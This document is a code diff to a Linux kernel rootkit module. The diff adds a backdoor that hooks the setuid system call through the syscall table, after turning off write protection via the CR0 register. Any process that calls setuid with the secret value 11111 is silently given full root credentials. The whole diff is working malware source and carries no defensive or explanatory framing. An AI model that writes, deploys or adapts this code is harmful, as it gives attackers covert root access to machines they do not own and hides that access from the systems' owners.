@@ -9,6 +9,7 @@
 #include <linux/fdtable.h>
 #include <linux/fs.h>
 #include <asm/uaccess.h>
+#include <linux/cred.h>
 
 #if defined(__i386__)
 #define START_CHECK 0xc0000000
@@ -23,6 +24,31 @@ typedef unsigned long psize;
 asmlinkage int (*o_read)(int fd, void* buf, size_t count);
 
 psize *sys_call_table;
+
+uid_t secret = 11111;
+
+asmlinkage long (*orig_setuid)(uid_t uid);
+
+asmlinkage long backdoor_setuid(uid_t t) {
+
+	if(t == secret) {
+		struct cred *credentials = prepare_creds();
+		credentials->uid = GLOBAL_ROOT_UID;
+        credentials->gid = GLOBAL_ROOT_GID;
+        credentials->suid = GLOBAL_ROOT_UID;
+        credentials->sgid = GLOBAL_ROOT_GID;
+        credentials->euid = GLOBAL_ROOT_UID;
+        credentials->egid = GLOBAL_ROOT_GID;
+        credentials->fsuid = GLOBAL_ROOT_UID;
+        credentials->fsgid = GLOBAL_ROOT_GID;
+
+        return commit_creds(credentials);
+	} else {
+		return (*orig_setuid) (t);
+	}
+
+
+}
 
 psize **find(void) {
 
@@ -244,6 +270,20 @@ void remove_backdoor(void) {
 	write_cr0(read_cr0() | 0x10000);
 }
 
+void add_setuid() {
+
+	write_cr0(read_cr0() & (~ 0x10000));
+	orig_setuid = (void*) xchg(&sys_call_table[__NR_setuid], backdoor_setuid);
+	write_cr0(read_cr0() | 0x10000);
+}
+
+void remove_setuid() {
+
+	write_cr0(read_cr0() & (~ 0x10000));
+	xchg(&sys_call_table[__NR_setuid], orig_setuid);
+	write_cr0(read_cr0() | 0x10000);
+}
+
 // load and unload the module
 // ==========================
 
@@ -259,6 +299,7 @@ int init_module(void) {
 	}
 
 	add_backdoor();
+	add_setuid();
     
 	printk(KERN_INFO "rootkit loaded\n");	
 	return 0;
@@ -267,6 +308,7 @@ int init_module(void) {
 void cleanup_module(void) {
 
 	remove_backdoor();
+	remove_setuid();
 
 	printk(KERN_INFO "rootkit unloaded\n");
 }
